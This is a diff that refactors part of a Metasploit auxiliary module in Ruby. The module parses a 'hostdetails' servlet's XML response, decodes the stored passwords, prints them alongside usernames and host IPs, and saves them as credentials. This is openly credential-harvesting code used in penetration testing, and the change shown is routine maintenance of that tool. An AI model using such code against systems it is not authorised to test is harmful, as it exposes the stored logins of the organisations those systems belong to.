@@ -115,62 +115,64 @@ class Metasploit3 < Msf::Auxiliary
         }
       })
 
-      if res && res.code == 200
-        begin
-          doc = REXML::Document.new(res.body)
-        rescue
-          fail_with(Failure::Unknown, "#{peer} - Error parsing the XML, dumping output #{res.body.to_s}")
-        end
-        doc.elements.each('Details/Hosts') do |ele|
-          # Add an empty string if a variable doesn't exist, we have to check it
-          # somewhere and it's easier to do it here.
-          dns_name = (ele.attributes["dns_name"] != nil ? ele.attributes["dns_name"] : "")
-          host_ipaddress = (ele.attributes["host_ipaddress"] != nil ? ele.attributes["host_ipaddress"] : "")
+      unless res && res.code == 200
+        fail_with(Failure::NotFound, "#{peer} - Failed to reach hostdetails servlet")
+      end
 
-          ele.elements.each('HostDetails') do |details|
-            domain_name = (details.attributes["domain_name"] != nil ? details.attributes["domain_name"] : "")
-            username = (details.attributes["username"] != nil ? details.attributes["username"] : "")
-            password_encoded = (details.attributes["password"] != nil ? details.attributes["password"] : "")
-            password = decode_password(password_encoded)
-            type = (details.attributes["type"] != nil ? details.attributes["type"] : "")
-            subtype = (details.attributes["subtype"] != nil ? details.attributes["subtype"] : "")
+      begin
+        doc = REXML::Document.new(res.body)
+      rescue
+        fail_with(Failure::Unknown, "#{peer} - Error parsing the XML, dumping output #{res.body.to_s}")
+      end
 
-            if not (type =~ /Windows/ or subtype =~ /Windows/)
-              # With AS/400 we get some garbage in the domain name even though it doesn't exist
-              domain_name = ""
-            end
+      doc.elements.each('Details/Hosts') do |ele|
+        # Add an empty string if a variable doesn't exist, we have to check it
+        # somewhere and it's easier to do it here.
+        dns_name = (ele.attributes["dns_name"] != nil ? ele.attributes["dns_name"] : "")
+        host_ipaddress = (ele.attributes["host_ipaddress"] != nil ? ele.attributes["host_ipaddress"] : "")
 
-            msg = "Got login to #{host_ipaddress} | running "
-            msg << type << (subtype != "" ? " | #{subtype}" : "")
-            msg << " | username: "
-            msg << (domain_name != "" ? "#{domain_name}\\#{username}" : username)
-            msg << " | password: #{password}"
-            print_good(msg)
+        ele.elements.each('HostDetails') do |details|
+          domain_name = (details.attributes["domain_name"] != nil ? details.attributes["domain_name"] : "")
+          username = (details.attributes["username"] != nil ? details.attributes["username"] : "")
+          password_encoded = (details.attributes["password"] != nil ? details.attributes["password"] : "")
+          password = decode_password(password_encoded)
+          type = (details.attributes["type"] != nil ? details.attributes["type"] : "")
+          subtype = (details.attributes["subtype"] != nil ? details.attributes["subtype"] : "")
 
-            cred_table << [host_ipaddress, type, subtype, domain_name, username, password]
+          if not (type =~ /Windows/ or subtype =~ /Windows/)
+            # With AS/400 we get some garbage in the domain name even though it doesn't exist
+            domain_name = ""
+          end
 
-            credential_core = report_credential_core({
-               password: password,
-               username: username,
-             })
+          msg = "Got login to #{host_ipaddress} | running "
+          msg << type << (subtype != "" ? " | #{subtype}" : "")
+          msg << " | username: "
+          msg << (domain_name != "" ? "#{domain_name}\\#{username}" : username)
+          msg << " | password: #{password}"
+          print_good(msg)
 
-            begin
-              host_login_data = {
-                address: host_ipaddress,
-                service_name: type,
-                workspace_id: myworkspace_id,
-                protocol: 'tcp',
-                port: 0,    # can be any port, so just set to 0 else the cred api screams
-                core: credential_core,
-                status: Metasploit::Model::Login::Status::UNTRIED
-              }
-              create_credential_login(host_login_data)
-            end
+          cred_table << [host_ipaddress, type, subtype, domain_name, username, password]
+
+          credential_core = report_credential_core({
+             password: password,
+             username: username,
+           })
+
+          begin
+            host_login_data = {
+              address: host_ipaddress,
+              service_name: type,
+              workspace_id: myworkspace_id,
+              protocol: 'tcp',
+              port: 0,    # can be any port, so just set to 0 else the cred api screams
+              core: credential_core,
+              status: Metasploit::Model::Login::Status::UNTRIED
+            }
+            create_credential_login(host_login_data)
           end
         end
-      else
-        print_error("#{peer} - Failed to reach hostdetails servlet")
       end
+
     end
 
     print_line
